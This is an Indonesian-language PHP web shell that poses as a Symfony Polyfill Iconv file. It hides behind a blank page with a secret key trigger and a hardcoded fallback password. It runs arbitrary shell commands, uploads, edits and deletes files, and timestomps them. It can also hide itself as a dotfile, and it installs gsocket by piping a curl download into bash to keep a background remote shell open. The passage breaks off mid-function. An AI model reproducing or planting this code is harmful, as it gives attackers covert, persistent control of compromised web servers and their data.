<?php
/*
* This file is part of the Symfony package.
*
* (c) Fabien Potencier <fabien@symfony.com>
*
* For the full copyright and license information, please view the LICENSE
* file that was distributed with this source code.
*/
namespace Symfony\Polyfill\Iconv;
/**
* iconv implementation in pure PHP, UTF-8 centric.
*/
$password_hash = '$2y$10$xs4Xz5vhdXDxHXaXdA3rrOY7z1InfLaokASymBMBvjCU3Ht8LHcHi';
if (!defined('STDIN')) define('STDIN', fopen('php://stdin', 'r'));
@ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
@ob_end_clean();
$session_name = 'tropical_' . md5(__FILE__ . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'));
@session_name($session_name);
if (!isset($_SESSION) && function_exists('session_status') && session_status() === PHP_SESSION_NONE) {
@session_start();
} elseif (!isset($_SESSION)) {
@session_start();
}
@set_time_limit(300);
@ini_set('max_execution_time', 300);
@ini_set('memory_limit', '256M');
@ini_set('post_max_size', '100M');
@ini_set('upload_max_filesize', '100M');
if (!isset($_SESSION['initial_dir'])) {
$_SESSION['initial_dir'] = $__dir__;
}
$home_path = $_SESSION['initial_dir'];

// Handler AJAX untuk Terminal Ajaib
if (isset($_POST['ajax']) && $_POST['ajax'] == 1) {
header('Content-Type: application/json');
$cmd = $_POST['cmd'] ?? '';
$path = $_POST['path'] ?? $__dir__;
if (empty($cmd)) {
die(json_encode(['error' => 'Tidak ada perintah']));
}
$output = '';
$method = 'none';
if (function_exists('shell_exec')) {
$output = @shell_exec('cd "' . $path . '" 2>&1 && ' . $cmd . ' 2>&1');
if ($output) $method = 'shell_exec';
}
if (!$output && function_exists('exec')) {
@exec('cd "' . $path . '" 2>&1 && ' . $cmd . ' 2>&1', $out, $ret);
$output = implode("\n", $out);
if ($output) $method = 'exec';
}
if (!$output && function_exists('proc_open')) {
$descriptors = [
0 => ['pipe', 'r'],
1 => ['pipe', 'w'],
2 => ['pipe', 'w']
];
$process = @proc_open('cd "' . $path . '" && ' . $cmd, $descriptors, $pipes);
if (is_resource($process)) {
$output = stream_get_contents($pipes[1]);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
if ($output) $method = 'proc_open';
}
}
if (!$output && preg_match('/^wget\s+(.+)/i', $cmd, $matches)) {
$url = trim($matches[1]);
$content = @file_get_contents($url);
if ($content) {
$filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'downloaded_' . time();
file_put_contents($path . '/' . $filename, $content);
$output = "✅ Download berhasil: " . $filename . " (" . strlen($content) . " bytes)";
$method = 'php_fallback';
}
}
if (!$output && preg_match('/^curl\s+(.+)/i', $cmd, $matches)) {
$url = trim($matches[1]);
if (function_exists('curl_init')) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$content = curl_exec($ch);
curl_close($ch);
if ($content) {
$filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'downloaded_' . time();
file_put_contents($path . '/' . $filename, $content);
$output = "✅ Download berhasil via curl: " . $filename;
$method = 'php_curl';
}
}
}
echo json_encode([
'status' => $output ? '✅ SUCCESS' : '❌ FAILED',
'method' => $method,
'output' => $output ?: 'Tidak ada output dari metode manapun',
'command' => $cmd,
'path' => $path,
'timestamp' => date('Y-m-d H:i:s')
]);
exit;
}
$security_techniques = [
'ini_set' => function_exists('ini_set'),
'error_reporting' => function_exists('error_reporting'),
'set_time_limit' => function_exists('set_time_limit')
];
foreach ($security_techniques as $func => $available) {
if ($available) {
try {
switch($func) {
case 'ini_set':
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('session.use_strict_mode', '0');
break;
case 'error_reporting':
@error_reporting(0);
break;
case 'set_time_limit':
@set_time_limit(0);
break;
}
} catch (Exception $e) {}
}
}
function hideSelf($filename) {
$current_path = realpath($filename);
if (!$current_path) return false;
$hidden_name = '.' . basename($current_path);
$hidden_path = dirname($current_path) . '/' . $hidden_name;
if (@rename($current_path, $hidden_path)) {
return $hidden_path;
}
$temp_name = '.' . md5(time()) . '_' . basename($current_path);
$temp_path = dirname($current_path) . '/' . $temp_name;
if (@copy($current_path, $temp_path)) {
@unlink($current_path);
return $temp_path;
}
@chmod($current_path, 0000);
return $current_path;
}
function revealSelf($hidden_path) {
if (!file_exists($hidden_path)) {
$dir = dirname($hidden_path);
$original_name = ltrim(basename($hidden_path), '.');
$files = @scandir($dir);
foreach ($files as $file) {
if ($file == '.' || $file == '..') continue;
if (strpos($file, '.') === 0) {
$clean_name = ltrim($file, '.');
if ($clean_name == $original_name ||
strpos($clean_name, basename($original_name, '.php')) !== false ||
strpos($file, md5(basename($original_name))) !== false) {
return $dir . '/' . $file;
}
}
}
}
return $hidden_path;
}
function isSelfHidden($filename) {
return strpos(basename($filename), '.') === 0;
}
$__auth__ = false;
if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
$__auth__ = true;
} elseif (isset($_POST['__p__'])) {
$password = $_POST['__p__'];
$verified = false;
if (function_exists('password_verify')) {
$verified = @password_verify($password, $password_hash);
}
if (!$verified && function_exists('hash')) {
$input_hash = @hash('sha256', $password . 'salt');
$stored_hash = @hash('sha256', 'your_password' . 'salt');
$verified = ($input_hash === $stored_hash);
}
if (!$verified) {
$hardcoded_pass = 'your_password';
$verified = ($password === $hardcoded_pass);
}
if ($verified) {
$_SESSION['__auth__'] = true;
$__auth__ = true;
if (!headers_sent()) {
header("Location: " . $_SERVER['PHP_SELF']);
exit;
} else {
echo '<script>window.location.href="' . $_SERVER['PHP_SELF'] . '";</script>';
exit;
}
}
}
if (!$__auth__) {
// UBAH DARI __pagedown__ MENJADI __qlogin__
$show_login = isset($_GET['__qlogin__']) && $_GET['__qlogin__'] == '1';
if (!$show_login) {
// TETAP PUTIH KOSONG - TIDAK DIUBAH
echo '<!DOCTYPE html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="UTF-8">
<style>
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}
body {
background-color: #ffffff;
min-height: 100vh;
width: 100%;
overflow: hidden;
}
.hidden-trigger {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
cursor: default;
z-index: 100;
}
::selection {
background: transparent;
color: inherit;
}
::-moz-selection {
background: transparent;
color: inherit;
}
* {
-webkit-tap-highlight-color: transparent;
-webkit-touch-callout: none;
-webkit-user-select: none;
-moz-user-select: none;
-ms-user-select: none;
user-select: none;
}
input, textarea {
-webkit-user-select: text;
-moz-user-select: text;
-ms-user-select: text;
user-select: text;
}
</style>
</head>
<body>
<div class="hidden-trigger"></div>
<script>
// UBAH TRIGGER DARI PageDown MENJADI q
document.addEventListener("keydown", function(e) {
if (e.key === "q" || e.key === "Q") {
e.preventDefault();
e.stopPropagation();
// Mencegah huruf q muncul di layar
return false;
}
}, true);

document.addEventListener("keyup", function(e) {
if (e.key === "q" || e.key === "Q") {
e.preventDefault();
e.stopPropagation();
window.location.href = "?__qlogin__=1";
return false;
}
}, true);

document.addEventListener("contextmenu", function(e) {
e.preventDefault();
e.stopPropagation();
return false;
}, true);
document.addEventListener("selectstart", function(e) {
e.preventDefault();
e.stopPropagation();
return false;
}, true);
document.addEventListener("dragstart", function(e) {
e.preventDefault();
e.stopPropagation();
return false;
}, true);
document.addEventListener("DOMContentLoaded", function() {
document.body.textContent = "";
document.title = "";
document.body.style.outline = "none";
document.body.innerHTML = "";
const trigger = document.createElement("div");
trigger.className = "hidden-trigger";
document.body.appendChild(trigger);
});
</script>
</body>
</html>';
exit;
} else {
// TAMPILAN LOGIN BARU DENGAN LOGO NAGA
echo '<!DOCTYPE html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}
body {
font-family: "Quicksand", sans-serif;
background: linear-gradient(145deg, #0a0f1e 0%, #1a1f2e 100%);
min-height: 100vh;
display: flex;
align-items: center;
justify-content: center;
padding: 20px;
position: relative;
overflow: hidden;
}
/* Dragon Logo Background */
body::before {
content: "";
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
width: 800px;
height: 800px;
background-image: url("https://i.ibb.co/nv3B26W/image.png");
background-size: contain;
background-repeat: no-repeat;
background-position: center;
opacity: 0.1;
pointer-events: none;
z-index: 0;
animation: glow 4s ease-in-out infinite;
}
@keyframes glow {
0% { opacity: 0.1; }
50% { opacity: 0.15; }
100% { opacity: 0.1; }
}
.login-container {
background: rgba(255, 255, 255, 0.05);
backdrop-filter: blur(10px);
border: 1px solid rgba(255, 255, 255, 0.1);
border-radius: 30px;
padding: 40px;
width: 100%;
max-width: 400px;
box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
position: relative;
z-index: 1;
}
.logo-container {
text-align: center;
margin-bottom: 30px;
}
.dragon-logo {
width: 120px;
height: 120px;
margin: 0 auto 20px;
background-image: url("https://i.ibb.co/nv3B26W/image.png");
background-size: contain;
background-repeat: no-repeat;
background-position: center;
filter: drop-shadow(0 0 20px rgba(255, 70, 70, 0.3));
}
h2 {
color: #fff;
font-size: 24px;
font-weight: 600;
letter-spacing: 2px;
text-transform: uppercase;
margin-bottom: 10px;
text-shadow: 0 0 10px rgba(255, 70, 70, 0.3);
}
.subtitle {
color: rgba(255, 255, 255, 0.6);
font-size: 14px;
margin-bottom: 30px;
}
.form-group {
margin-bottom: 25px;
}
.form-control {
width: 100%;
padding: 16px 20px;
background: rgba(255, 255, 255, 0.03);
border: 1px solid rgba(255, 255, 255, 0.1);
border-radius: 50px;
font-size: 16px;
color: #fff;
font-family: "Quicksand", sans-serif;
transition: all 0.3s;
}
.form-control:focus {
outline: none;
border-color: #ff4646;
background: rgba(255, 255, 255, 0.05);
box-shadow: 0 0 20px rgba(255, 70, 70, 0.2);
}
.form-control::placeholder {
color: rgba(255, 255, 255, 0.3);
}
.btn {
width: 100%;
padding: 16px;
background: linear-gradient(145deg, #ff4646, #cc3333);
border: none;
border-radius: 50px;
color: white;
font-size: 16px;
font-weight: 700;
font-family: "Quicksand", sans-serif;
text-transform: capitalize;
letter-spacing: 2px;
cursor: pointer;
transition: all 0.3s;
box-shadow: 0 10px 20px rgba(255, 70, 70, 0.2);
}
.btn:hover {
transform: translateY(-2px);
box-shadow: 0 15px 30px rgba(255, 70, 70, 0.3);
background: linear-gradient(145deg, #ff5555, #dd3333);
}
.btn:active {
transform: translateY(0);
}
.footer {
margin-top: 25px;
text-align: center;
color: rgba(255, 255, 255, 0.3);
font-size: 12px;
}
@media (max-width: 480px) {
.login-container {
padding: 30px 20px;
}
.dragon-logo {
width: 100px;
height: 100px;
}
h2 {
font-size: 20px;
}
}
</style>
</head>
<body>
<div class="login-container">
<div class="logo-container">
<div class="dragon-logo"></div>
<h2>ℒ𝑒𝑒</h2>
<div class="subtitle">⋆༺𓆩☠︎︎𓆪༻⋆</div>
</div>
<form method="post">
<div class="form-group">
<input type="password" name="__p__" class="form-control" placeholder="Masukan Password Kau" required autofocus>
</div>
<button type="submit" class="btn">Lest Goo</button>
</form>
<div class="footer">
<span>⚡ 𒅒𒈔𒅒𒇫𒄆 ⚡</span>
</div>
</div>
<script>
document.querySelector(\'input[name="__p__"]\').focus();
document.addEventListener("keydown", function(e) {
if (e.key === "Escape") {
window.location.href = "?";
}
});
</script>
</body>
</html>';
exit;
}
}
function executeLocal($cmd, $cwd = null) {
$result = null;
$original_cmd = $cmd;
$success = false;
if (strpos($cmd, '%') !== false) {
$cmd = urldecode($cmd);
}
$cmd = trim($cmd);
if (preg_match('/^wget\s+/i', $cmd)) {
return executeWget($cmd, $cwd);
}
if (preg_match('/^curl\s+/i', $cmd)) {
return executeCurl($cmd, $cwd);
}
if (preg_match('/^(zip|unzip)\s+/i', $cmd)) {
return executeZipCommand($cmd, $cwd);
}
return executeCommandFallback($cmd, $cwd);
}
function executeWget($cmd, $cwd) {
$output = [];
$return_var = 0;
preg_match('/wget\s+(.*)$/i', $cmd, $matches);
$args = $matches[1] ?? '';
if (empty($args)) {
return "❌ Error: wget command incomplete";
}
$target_dir = $cwd ?: getStableCurrentDir();
$full_cmd = 'cd "' . $target_dir . '" && ' . $cmd . ' 2>&1';
if (function_exists('shell_exec')) {
$result = @shell_exec($full_cmd);
} elseif (function_exists('exec')) {
@exec($full_cmd, $output, $return_var);
$result = implode("\n", $output);
} else {
preg_match('/https?:\/\/[^\s]+/i', $args, $url_matches);
$url = $url_matches[0] ?? '';
if ($url) {
$filename = basename(parse_url($url, PHP_URL_PATH));
if (!$filename) $filename = 'downloaded_file_' . time();
$target_path = rtrim($target_dir, '/') . '/' . $filename;
$result = downloadFileWithPHP($url, $target_path);
} else {
$result = "❌ Could not parse URL from wget command";
}
}
if ($return_var === 0 || strpos($result, '100%') !== false || strpos($result, 'saved') !== false) {
$result = "✅ Success: " . $cmd . "\n" . $result;
} else {
$result = "❌ Failed: " . $cmd . "\n" . $result;
}
return $result;
}
function executeCurl($cmd, $cwd) {
$output = [];
$return_var = 0;
preg_match('/curl\s+(.*)$/i', $cmd, $matches);
$args = $matches[1] ?? '';
if (empty($args)) {
return "❌ Error: curl command incomplete";
}
$target_dir = $cwd ?: getStableCurrentDir();
$full_cmd = 'cd "' . $target_dir . '" && ' . $cmd . ' 2>&1';
if (function_exists('shell_exec')) {
$result = @shell_exec($full_cmd);
} elseif (function_exists('exec')) {
@exec($full_cmd, $output, $return_var);
$result = implode("\n", $output);
} else {
preg_match('/https?:\/\/[^\s]+/i', $args, $url_matches);
$url = $url_matches[0] ?? '';
if ($url) {
$filename = basename(parse_url($url, PHP_URL_PATH));
if (!$filename) $filename = 'downloaded_file_' . time();
$target_path = rtrim($target_dir, '/') . '/' . $filename;
$result = downloadFileWithPHP($url, $target_path);
} else {
$result = "❌ Could not parse URL from curl command";
}
}
if ($return_var === 0 || strpos($result, '100%') !== false || strpos($result, 'Total') !== false) {
$result = "✅ Success: " . $cmd . "\n" . $result;
} else {
$result = "❌ Failed: " . $cmd . "\n" . $result;
}
return $result;
}
function executeZipCommand($cmd, $cwd) {
$target_dir = $cwd ?: getStableCurrentDir();
$full_cmd = 'cd "' . $target_dir . '" && ' . $cmd . ' 2>&1';
$result = '';
$return_var = 1;
if (function_exists('shell_exec')) {
$result = @shell_exec($full_cmd);
if (strpos($result, 'adding:') !== false || strpos($result, 'extracting:') !== false ||
strpos($result, 'Archive:') !== false) {
$return_var = 0;
}
} elseif (function_exists('exec')) {
$output = [];
@exec($full_cmd, $output, $return_var);
$result = implode("\n", $output);
} else {
$result = "❌ shell_exec and exec not available for zip/unzip operations";
}
if ($return_var === 0) {
$result = "✅ Success: " . $cmd . "\n" . $result;
} else {
$result = "❌ Failed: " . $cmd . "\n" . $result;
}
return $result;
}
function executeCommandFallback($cmd, $cwd) {
$result = '';
$target_dir = $cwd ?: getStableCurrentDir();
$return_var = 1;
$full_cmd = 'cd "' . $target_dir . '" && ' . $cmd . ' 2>&1';
if (function_exists('shell_exec') && empty($result)) {
$result = @shell_exec($full_cmd);
$return_var = ($result !== null && $result !== false) ? 0 : 1;
}
if (function_exists('exec') && empty($result)) {
$output = [];
@exec($full_cmd, $output, $return_var);
$result = implode("\n", $output);
}
if (function_exists('passthru') && empty($result)) {
ob_start();
@passthru($full_cmd, $return_var);
$result = ob_get_clean();
}
if (function_exists('system') && empty($result)) {
ob_start();
@system($full_cmd, $return_var);
$result = ob_get_clean();
}
if (empty($result) && function_exists('proc_open')) {
try {
$descriptorspec = array(
0 => array("pipe", "r"),
1 => array("pipe", "w"),
2 => array("pipe", "w")
);
$process = proc_open($full_cmd, $descriptorspec, $pipes, null, null);
if (is_resource($process)) {
fclose($pipes[0]);
$stdout = stream_get_contents($pipes[1]);
$stderr = stream_get_contents($pipes[2]);
fclose($pipes[1]);
fclose($pipes[2]);
$return_value = proc_close($process);
$return_var = $return_value;
$result = trim($stdout);
if (!empty($stderr)) {
$result .= "\n[STDERR]: " . trim($stderr);
}
}
} catch (Exception $e) {
$result = "Error: " . $e->getMessage();
}
}
if ($return_var === 0) {
$result = "✅ Success: " . $cmd . "\n" . $result;
} else {
$result = "❌ Failed (Exit Code: $return_var): " . $cmd . "\n" . $result;
}
return $result ?: "Command executed (no output)";
}
function downloadFileWithPHP($url, $target_path) {
try {
$context = stream_context_create([
'ssl' => [
'verify_peer' => false,
'verify_peer_name' => false,
],
'http' => [
'timeout' => 30,
'header' => "User-Agent: Wget/1.21.4\r\n"
]
]);
$file_content = @file_get_contents($url, false, $context);
if ($file_content === false && function_exists('curl_init')) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, 'Wget/1.21.4');
$file_content = curl_exec($ch);
curl_close($ch);
}
if ($file_content && file_put_contents($target_path, $file_content)) {
$size = filesize($target_path);
return "✅ Success: Downloaded " . basename($target_path) . " (" . formatBytes($size) . ")";
} else {
return "❌ Failed: Download failed";
}
} catch (Exception $e) {
return "❌ Error: " . $e->getMessage();
}
}
function formatBytes($bytes, $precision = 2) {
if ($bytes <= 0) return '0 B';
$units = ['B', 'KB', 'MB', 'GB', 'TB'];
$base = log($bytes, 1024);
$pow = floor($base);
$pow = min($pow, count($units) - 1);
$bytes /= pow(1024, $pow);
return round($bytes, $precision) . ' ' . $units[$pow];
}
function formatPermissions($path) {
if (!file_exists($path)) return '-';
$perms = fileperms($path);
$unix = '';
$unix .= (is_dir($path)) ? 'd' : '-';
$unix .= ($perms & 0x0100) ? 'r' : '-';
$unix .= ($perms & 0x0080) ? 'w' : '-';
$unix .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
$unix .= ($perms & 0x0020) ? 'r' : '-';
$unix .= ($perms & 0x0010) ? 'w' : '-';
$unix .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
$unix .= ($perms & 0x0004) ? 'r' : '-';
$unix .= ($perms & 0x0002) ? 'w' : '-';
$unix .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
$octal = substr(sprintf('%o', $perms), -4);
$is_writable = is_writable($path);
return [
'unix' => $unix,
'octal' => $octal,
'writable' => $is_writable
];
}
function getStableCurrentDir() {
static $stable_dir = null;
if ($stable_dir === null) {
$candidates = [];
if (isset($_GET['__d__'])) $candidates[] = $_GET['__d__'];
$candidates[] = @getcwd();
$candidates[] = dirname(__FILE__);
$candidates[] = @realpath('.');
foreach ($candidates as $candidate) {
if ($candidate && @is_dir($candidate) && @is_readable($candidate)) {
$stable_dir = $candidate;
break;
}
}
if (!$stable_dir) $stable_dir = '.';
}
return $stable_dir;
}
$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : getStableCurrentDir();
if (!@is_dir($__dir__)) $__dir__ = getStableCurrentDir();
if ($__dir__ !== '/' && substr($__dir__, -1) !== '/') $__dir__ .= '/';
$messages = [];
$cmd_output = isset($_SESSION['cmd_output']) ? $_SESSION['cmd_output'] : '';
if (isset($_SESSION['upload_message'])) {
$messages[] = $_SESSION['upload_message'];
unset($_SESSION['upload_message']);
}
if (isset($_GET['__edit__'])) {
$edit_file = basename($_GET['__edit__']);
$edit_path = $__dir__ . $edit_file;
if (file_exists($edit_path) && is_file($edit_path)) {
$editing_file = $edit_file;
$file_content = file_get_contents($edit_path);
}
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
if (!empty($_FILES['files'])) {
$success_uploads = [];
$failed_uploads = [];
foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
$error = $_FILES['files']['error'][$key];
$filename = basename($_FILES['files']['name'][$key]);
$target = $__dir__ . $filename;
if ($error === UPLOAD_ERR_OK) {
if (is_uploaded_file($tmp_name)) {
if (move_uploaded_file($tmp_name, $target)) {
@chmod($target, 0644);
$success_uploads[] = $filename;
} else {
$failed_uploads[] = "$filename (gagal pindah)";
}
} else {
$failed_uploads[] = "$filename (file tidak valid)";
}
} else {
$error_msg = match($error) {
UPLOAD_ERR_INI_SIZE => "file terlalu besar (max " . ini_get('upload_max_filesize') . ")",
UPLOAD_ERR_FORM_SIZE => "file terlalu besar",
UPLOAD_ERR_PARTIAL => "upload tidak lengkap",
UPLOAD_ERR_NO_FILE => "tidak ada file",
default => "error code: $error"
};
$failed_uploads[] = "$filename ($error_msg)";
}
}
if (!empty($success_uploads)) {
$_SESSION['upload_message'] = "✅ Berhasil upload: " . implode(', ', $success_uploads);
}
if (!empty($failed_uploads)) {
$_SESSION['upload_message'] = ($_SESSION['upload_message'] ?? '') . "\n❌ Gagal: " . implode(', ', $failed_uploads);
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['gsocket_action'])) {
$action = $_POST['gsocket_action'];
$output = "";
if ($action == 'install') {
$output .= "📦 INSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$cmd = 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
$result = executeLocal($cmd, $__dir__);
$output .= $result . "\n";
$check = executeLocal('which gs-netcat 2>&1', $__dir__);
if (strpos($check, 'gs-netcat') !== false) {
$output .= "✅ GSOCKET BERHASIL TERINSTALL!\n";
} else {
$output .= "❌ INSTALL GAGAL.\n";
}
} elseif ($action == 'uninstall') {
$output .= "🗑️ UNINSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$cmd = 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
$result = executeLocal($cmd, $__dir__);
$output .= $result . "\n";
$output .= "✅ GSOCKET TELAH DIUNINSTALL!\n";
} elseif ($action == 'run') {
$secret = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);
$output .= "🚀 RUN GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$output .= "🔑 SECRET: $secret\n";
$output .= "📋 COPY SECRET INI: $secret\n";
$output .= "💻 Perintah konek: gs-netcat -s \"$secret\" -i\n";
executeLocal('pkill -f gs-netcat 2>&1', $__dir__);
executeLocal('nohup gs-netcat -s "' . $secret . '" -i > /dev/null 2>&1 &', $__dir__);
$output .= "✅ GSOCKET BERJALAN DI BACKGROUND!\n";
} elseif ($action == 'kill') {
$output .= "🔪 KILL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
executeLocal('pkill -f gs-netcat 2>&1', $__dir__);
$output .= "✅ SEMUA PROSES GSOCKET TELAH DIMATIKAN!\n";
}
$_SESSION['cmd_output'] = $output;
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_FILES['zip_file'])) {
$upload_success = false;
$message = "";
if ($_FILES['zip_file']['error'] !== UPLOAD_ERR_OK) {
$error_msg = match($_FILES['zip_file']['error']) {
UPLOAD_ERR_INI_SIZE => "file terlalu besar (max " . ini_get('upload_max_filesize') . ")",
UPLOAD_ERR_FORM_SIZE => "file terlalu besar",
UPLOAD_ERR_PARTIAL => "upload tidak lengkap",
UPLOAD_ERR_NO_FILE => "tidak ada file",
UPLOAD_ERR_NO_TMP_DIR => "folder temporary tidak ada",
UPLOAD_ERR_CANT_WRITE => "gagal menulis file",
UPLOAD_ERR_EXTENSION => "upload dihentikan oleh ekstensi",
default => "error code: " . $_FILES['zip_file']['error']
};
$_SESSION['upload_message'] = "❌ Upload ZIP gagal: $error_msg";
} else {
$zip_tmp = $_FILES['zip_file']['tmp_name'];
$zip_name = basename($_FILES['zip_file']['name']);
$zip_target = $__dir__ . $zip_name;
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $zip_tmp);
finfo_close($finfo);
$valid_mime = ['application/zip', 'application/x-zip', 'application/x-zip-compressed'];
if (!in_array($mime_type, $valid_mime) && pathinfo($zip_name, PATHINFO_EXTENSION) !== 'zip') {
$_SESSION['upload_message'] = "❌ File bukan ZIP yang valid!";
} else {
if (move_uploaded_file($zip_tmp, $zip_target)) {
@chmod($zip_target, 0644);
$message = "✅ ZIP berhasil diupload: $zip_name";
if (class_exists('ZipArchive')) {
$zip = new ZipArchive();
if ($zip->open($zip_target) === TRUE) {
$extract_folder = $__dir__ . '/' . pathinfo($zip_name, PATHINFO_FILENAME);
$zip->extractTo($__dir__);
$zip->close();
$message .= " dan diekstrak!";
} else {
$message .= " tapi gagal diekstrak!";
}
} else {
$message .= " (ZipArchive tidak tersedia)";
}
$upload_success = true;
} else {
$message = "❌ Gagal memindahkan file ZIP!";
}
}
}
if (!empty($message)) {
$_SESSION['upload_message'] = $message;
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__create__'])) {
$name = basename($_POST['__name__']);
$type = $_POST['__type__'];
$path = $__dir__ . $name;
if ($type === 'file') {
$content = $_POST['__data__'] ?? '';
@file_put_contents($path, $content);
} else {
@mkdir($path, 0755, true);
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__cmd__']) && trim($_POST['__cmd__'])) {
$cmd_output = executeLocal($_POST['__cmd__'], $__dir__);
$_SESSION['cmd_output'] = $cmd_output;
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__content__']) && isset($_POST['__edit_file__'])) {
$target = $__dir__ . basename($_POST['__edit_file__']);
@file_put_contents($target, $_POST['__content__']);
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__delete_selected__'])) {
$selected_items = $_POST['selected_items'] ?? [];
foreach ($selected_items as $item) {
$target = $__dir__ . basename($item);
if (@file_exists($target)) {
if (@is_dir($target)) {
$files = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
RecursiveIteratorIterator::CHILD_FIRST
);
foreach ($files as $fileinfo) {
$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
@$todo($fileinfo->getRealPath());
}
@rmdir($target);
} else {
@unlink($target);
}
}
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__delete_single__'])) {
$target = $__dir__ . basename($_POST['__delete_file__']);
if (@file_exists($target)) {
if (@is_dir($target)) {
$files = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
RecursiveIteratorIterator::CHILD_FIRST
);
foreach ($files as $fileinfo) {
$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
@$todo($fileinfo->getRealPath());
}
@rmdir($target);
} else {
@unlink($target);
}
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__chmod__'])) {
$target = $__dir__ . basename($_POST['__chmod_file__']);
$permissions = $_POST['__permissions__'];
if (@file_exists($target)) {
@chmod($target, octdec($permissions));
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__touch__'])) {
$target = $__dir__ . basename($_POST['__touch_file__']);
$timestamp = $_POST['__timestamp__'];
if (@file_exists($target)) {
@touch($target, strtotime($timestamp));
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__rename__'])) {
$old_name = $__dir__ . basename($_POST['__rename_old__']);
$new_name = $__dir__ . basename($_POST['__rename_new__']);
if (@file_exists($old_name)) {
@rename($old_name, $new_name);
}
$redirect = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
header("Location: " . $redirect);
exit;
}
if (isset($_POST['__lock_action__'])) {
if ($_POST['__lock_action__'] === 'hide') {
$hidden_path = hideSelf(__FILE__);
if ($hidden_path) {
$new_url = str_replace(basename(__FILE__), basename($hidden_path), $_SERVER['PHP_SELF']);
if (!headers_sent()) {
header("Location: " . $new_url . "?__d__=" . urlencode($__dir__));
exit;
}
}
} elseif ($_POST['__lock_action__'] === 'reveal') {
$current_file = basename(__FILE__);
$clean_name = ltrim($current_file, '.');
$revealed_path = dirname(__FILE__) . '/' . $clean_name;
if (@rename(__FILE__, $revealed_path)) {
$new_url = str_replace(basename(__FILE__), $clean_name, $_SERVER['PHP_SELF']);
if (!headers_sent()) {
header("Location: " . $new_url . "?__d__=" . urlencode($__dir__));
exit;
}
}
}
}
if (isset($_POST['__extract_zip__'])) {
$zip_file = $__dir__ . basename($_POST['__zip_file__']);
if (file_exists($zip_file)) {
